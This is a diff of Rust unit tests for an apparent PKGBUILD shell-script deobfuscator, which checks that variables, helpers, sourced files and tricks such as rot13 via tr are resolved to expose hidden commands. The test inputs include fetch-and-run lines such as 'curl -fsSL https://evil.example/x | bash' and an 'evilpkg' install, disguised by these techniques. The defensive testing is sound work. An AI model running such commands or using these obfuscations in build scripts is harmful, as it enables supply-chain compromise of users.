+            has(&out, "curl -fsSL https://evil.example/x | bash"),
+            "{out}"
+        );
+        let out = resolve("prepare() { _f=curl; }\nbuild() {\n  $_f -s u\n}");
+        assert!(has(&out, "curl -s u"), "{out}");
+        // A helper defined after its caller.
+        let out =
+            resolve("post_install() {\n  _setup\n  $_p install evilpkg\n}\n_setup() { _p=npm; }");
+        assert!(has(&out, "npm install evilpkg"), "{out}");
+        // `local` stays local.
+        let out = resolve("prepare() { local _f=curl; }\nbuild() {\n  $_f -s u\n}");
+        assert!(has(&out, "$_f -s u"), "{out}");
+    }
+
+    #[test]
+    fn helper_positional_args_resolve_for_literal_calls() {
+        let out = resolve("f() { \"$1\" -fsSL https://evil.example/x | bash; }; f curl");
+        assert!(
+            has(&out, "curl -fsSL https://evil.example/x | bash"),
+            "{out}"
+        );
+        let out = resolve("f() { \"$1$2\" install evilpkg; }; f n pm");
+        assert!(has(&out, "npm install evilpkg"), "{out}");
+        // Multi-line helper, call elsewhere, several call sites.
+        let out = resolve("run() {\n  $1 -s u\n}\nrun curl\nrun wget");
+        assert!(has(&out, "curl -s u"), "{out}");
+        assert!(has(&out, "wget -s u"), "{out}");
+        // A quoted sentence handed to a printer helper is text, not a command.
+        let out = resolve("msg() { echo \"==> $1\" >&2; }\nmsg \"curl https://e.example/x | sh\"");
+        assert!(!has(&out, "==> curl"), "{out}");
+        // No literal call, no resolution.
+        let out = resolve("f() { \"$1\" -s u; }");
+        assert!(has(&out, "\"$1\" -s u"), "{out}");
+    }
+
+    #[test]
+    fn sourced_sidecar_assignments_are_inlined() {
+        let car = vec![(
+            "vars.conf".to_string(),
+            "_f=curl\n_s=bash\n# note\n".to_string(),
+        )];
+        let src =
+            "package() {\n  . \"$srcdir/vars.conf\"\n  $_f -fsSL https://evil.example/x | $_s\n}";
+        let v = inline_sourced_assignments(src, &car).expect("variant");
+        assert_eq!(v.lines().count(), src.lines().count());
+        let out = resolve(&v);
+        assert!(
+            has(&out, "curl -fsSL https://evil.example/x | bash"),
+            "{out}"
+        );
+        // Different file name: nothing to inline.
+        assert!(inline_sourced_assignments(src, &[("other".into(), "a=b".into())]).is_none());
+    }
+
+    #[test]
+    fn new_constructs_keep_one_line_per_input_line() {
+        let src = [
+            "v=xnpmx; ${v:1:3} install a",
+            "n${zz}pm install b",
+            "$\"n\"$\"pm\" x",
+            "c=n; c+=pm; $c i",
+            "printf -v d %s npm; $d i",
+            "read -r e <<< npm; $e i",
+            "alias zz=npm",
+            "zz install z",
+            "{npm,install,x}",
+            "$(echo acz | tr a-z n-za-m) i",
+            "f() { \"$1\" a; }; f npm",
+            "a=(x npm); ${a[1]} i \\",
+            "  more",
+            "m() {\n  $1 b\n}",
+            "m npm",
+            "x=$(printf 'a\\nb'); $x",
+        ]
+        .join("\n");
+        let out = resolve(&src);
+        assert_eq!(out.lines().count(), src.lines().count(), "{out}");
+        // Also for a script whose resolution multiplies lines on purpose.
+        let src = "r() {\n  $1 a\n}\nr one\nr two\nr three\nr four\nr five";
+        assert_eq!(resolve(src).lines().count(), src.lines().count());
+    }
+
+    #[test]
+    fn new_constructs_stay_bounded() {
+        let big = "x".repeat(MAX_VALUE_LEN);
+        let src = format!("v={big}\nv+={big}\n${{v:1:3}} a\nw=${{v//x/yy}}\n$w");
+        let out = resolve(&src);
+        assert_eq!(out.lines().count(), src.lines().count());
+        assert!(
+            out.lines().all(|l| l.len() < 4 * MAX_VALUE_LEN),
+            "unbounded"
+        );
+    }
+
+    // --- panic / overflow regressions ----------------------------------------
+
+    #[test]
+    fn substring_never_overflows_or_panics() {
+        for spec in [
+            "1:9223372036854775807",
+            "9223372036854775807",
+            "9223372036854775807:9223372036854775807",
+            "-9223372036854775808",
+            "-9223372036854775808:-9223372036854775808",
+            "1:-9223372036854775808",
+            "-1:-9223372036854775808",
+            "3:-2",
+            "3:-100",
+            "100:2",
+            "-100:2",
+            "0:0",
+        ] {
+            let _ = substring("abcdef", spec);
+            let _ = substring("", spec);
+            let _ = substring("h\u{e9}llo\u{1f600}x", spec);
+        }
+        assert_eq!(
+            substring("abcdef", "1:9223372036854775807").unwrap(),
+            "bcdef"
+        );
+        assert_eq!(substring("abcdef", "-3").unwrap(), "def");
+        assert_eq!(substring("abcdef", "1:-1").unwrap(), "bcde");
+        assert_eq!(substring("abcdef", "3:-5").unwrap(), "");
+        assert_eq!(
+            substring("h\u{e9}\u{1f600}x", "1:2").unwrap(),
+            "\u{e9}\u{1f600}"
+        );
+        // End to end, in a PKGBUILD-shaped script.
+        let src = "_v=abcdef\npackage() {\n  echo \"${_v:1:9223372036854775807}\"\n}";
+        let out = resolve(src);
+        assert_eq!(out.lines().count(), src.lines().count());
+        assert!(out.contains("bcdef"), "{out}");
+    }
+
+    #[test]
+    fn operators_on_multibyte_values_do_not_panic() {
+        for src in [
+            "v=h\u{e9}llo\u{1f600}\n${v:1:3} ${v#h} ${v%x} ${v##*\u{e9}} ${v%%\u{1f600}*} ${v//\u{e9}/e} ${v^^} ${v,,} ${v: -2}",
+            "v=\u{1f600}\u{1f600}\n${v:0:1}${v:1}${v:2}${v:-1}",
+        ] {
+            let out = resolve(src);
+            assert_eq!(out.lines().count(), src.lines().count());
+        }
+    }
+
+    #[test]
+    fn huge_and_odd_numbers_in_other_helpers_are_safe() {
+        // tr ranges, printf escapes and ANSI-C escapes with extreme values.
+        let out = resolve("x=$(echo a | tr a-\u{10ffff} b-z)");
+        assert_eq!(out.lines().count(), 1);
+        let _ = resolve("c=$(printf '\\xfffffffff\\777777777')\n$c");
+        let _ = resolve("$'\\x' $'\\' $'\\u' ${v:99999999999999999999999}");
+        let _ = resolve("printf -v");
+        let _ = resolve("read");
+        let _ = resolve("mapfile <<<");
+        let _ = resolve("alias");
+        let _ = resolve("f() { :; }\nf");
+        let _ = resolve("${");
+        let _ = resolve("$(");
+        let _ = resolve("`");
+        let _ = resolve("{a,}");
+        let _ = resolve("{,}");
+    }
+
+    #[test]
+    fn apostrophe_inside_double_quotes_does_not_break_folding() {
+        let out = resolve("echo \"it's $(printf curl) now\"");
+        assert!(out.contains("it's curl now"), "{out}");
+        let out = resolve("echo 'a $(printf x)' \"$(printf curl)\"");
+        assert!(
+            out.contains("'a $(printf x)'") || out.contains("a $(printf x)"),
+            "{out}"
+        );
+        assert!(out.contains("curl"), "{out}");
+        assert_eq!(
+            fold_substitutions("\"it's\" $(printf curl)"),
+            "\"it's\" curl"
+        );
+        assert_eq!(fold_substitutions("'$(printf curl)'"), "'$(printf curl)'");
+        assert!(fold_command("echo \"it's\" | tr a-z n-za-m").is_some());
+    }
+
+    // --- hostile nesting: linear work, no deep recursion ----------------------
+
+    fn nest_cases(n: usize) -> Vec<(&'static str, String)> {
+        vec![
+            ("cmdsub", format!("{}x{}", "$(".repeat(n), ")".repeat(n))),
+            ("cmdsub-open", "$(".repeat(n)),
+            ("backtick", "`".repeat(n)),
+            (
+                "backtick-nest",
+                format!("{}x{}", "`a".repeat(n), "`".repeat(n)),
+            ),
+            (
+                "default",
+                format!("{}x{}", "${a:-".repeat(n), "}".repeat(n)),
+            ),
+            ("default-open", "${a:-".repeat(n)),
+            (
+                "quoted",
+                format!("{}x{}", "\"$(".repeat(n), ")\"".repeat(n)),
+            ),
+            (
+                "echo-nest",
+                format!("{}echo x{}", "$(echo ".repeat(n), ")".repeat(n)),
+            ),
+            ("brace", "${".repeat(n)),
+            ("subst-op", format!("a=x\n{}", "${a//x/${a#".repeat(n))),
+        ]
+    }
+
+    #[test]
+    fn deeply_nested_input_is_fast_and_does_not_overflow_the_stack() {
+        for n in [100usize, 2_000, 10_000] {
+            for (name, line) in nest_cases(n) {
+                let src = format!("package() {{\n  {line}\n}}");
+                let t = std::time::Instant::now();
+                let out = resolve(&src);
+                let took = t.elapsed();
+                assert_eq!(out.lines().count(), src.lines().count(), "{name} n={n}");
+                assert!(
+                    took < std::time::Duration::from_secs(5),
+                    "{name} n={n} took {took:?}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn substitution_folding_work_is_bounded_per_line() {
+        // Many openers each followed by a far-away closer: quadratic if every
+        // opener rescans the rest of the line.
+        let line = format!("{}{}", "$(echo a ".repeat(20_000), ")".repeat(20_000));
+        let t = std::time::Instant::now();
+        let _ = fold_substitutions(&line);
+        assert!(
+            t.elapsed() < std::time::Duration::from_secs(2),
+            "{:?}",
+            t.elapsed()
+        );
+        // Ordinary folding past an unrelated opener still works.
+        assert_eq!(fold_substitutions("$(printf curl) x"), "curl x");
+    }
+
+    // --- function index: one pass per file, bounded call-graph walk ----------
+
+    #[test]
+    fn function_index_matches_one_shot_helper_text() {
+        let src = "h() { curl x; }\nbuild() {\n  h\n}\npackage() { :; }";
+        let idx = FunctionIndex::new(src);
+        let t = idx.text_for("build");
+        assert!(t.contains("curl x"), "{t}");
+        assert_eq!(t, resolved_function_text(src, "build"));
+        // An uncalled helper stays out; an unknown entry yields nothing.
+        assert!(!idx.text_for("package").contains("curl"));
+        assert_eq!(idx.text_for("nope"), "");
+    }
+
+    #[test]
+    fn call_graph_walk_is_capped_but_keeps_remaining_bodies() {
+        let n = MAX_FUNCS_PER_ENTRY * 4;
+        let mut src: String = (0..n).map(|i| format!("f{i}() {{ curl x; }}\n")).collect();
+        src.push_str("build() {\n");
+        for i in 0..n {
+            src.push_str(&format!("  f{i}\n"));
+        }
+        src.push_str("}\n");
+        let t = FunctionIndex::new(&src).text_for("build");
+        // Every helper's body is still present, resolved or not.
+        assert_eq!(t.matches("curl x").count(), n);
+    }
+
+    #[test]
+    fn many_helpers_and_entry_points_scale_linearly() {
+        let n = 5_000;
+        let mut src: String = (0..n).map(|i| format!("f{i}() {{ curl x; }}\n")).collect();
+        src.push_str("build() {\n");
+        for i in 0..n {
+            src.push_str(&format!("  f{i}\n"));
+        }
+        src.push_str("}\n");
+        for j in 0..200 {
+            src.push_str(&format!("package_p{j}() {{\n  f{j}\n}}\n"));
+        }
+        let t = std::time::Instant::now();
+        let idx = FunctionIndex::new(&src);
+        let _ = idx.text_for("build");
+        for j in 0..200 {
+            let _ = idx.text_for(&format!("package_p{j}"));
+        }
+        assert!(
+            t.elapsed() < std::time::Duration::from_secs(30),
+            "{:?}",
+            t.elapsed()
+        );
+    }
+
+    #[test]
+    fn cached_resolution_equals_uncached_for_large_inputs() {
+        let mut src = String::from("x=curl\n");
+        while src.len() < 40 * 1024 {
+            src.push_str("echo filler line\n");
+        }
+        src.push_str("$x https://evil.example/p | sh\n");
+        let fresh = resolve_variables_uncached(&src);
+        assert_eq!(resolve_variables(&src), fresh);
+        assert_eq!(resolve_variables(&src), fresh, "second call hits the cache");
+        // A different text is never answered from the cache.
+        let other = src.replace("x=curl", "x=wget");
+        let out = resolve_variables(&other);
+        assert!(out.contains("wget https://evil.example/p | sh"));
+        assert!(!out.contains("curl https://evil.example/p"));
+    }
+
+    #[test]
+    fn deep_helper_chains_are_followed_to_the_end() {
+        let mut chain = String::new();
+        for i in 1..10 {
+            chain.push_str(&format!("c{i}() {{ c{}; }}\n", i + 1));
+        }
+        chain.push_str("c10() { curl x; }\nbuild() { c1; }\n");
+        let t = FunctionIndex::new(&chain).text_for("build");
+        assert!(t.contains("curl x"), "{t}");
+        // The same chain, never called: nothing is attributed to build().
+        let mut uncalled = chain.replace("build() { c1; }", "build() { :; }");
+        uncalled.push_str("package() { :; }\n");
+        let idx = FunctionIndex::new(&uncalled);
+        assert!(!idx.text_for("build").contains("curl"));
+        assert!(!idx.text_for("package").contains("curl"));
+        // Cycles terminate.
+        let cyc = "a() { b; }\nb() { a; curl x; }\nbuild() { a; }";
+        assert!(FunctionIndex::new(cyc).text_for("build").contains("curl x"));
     }
 }
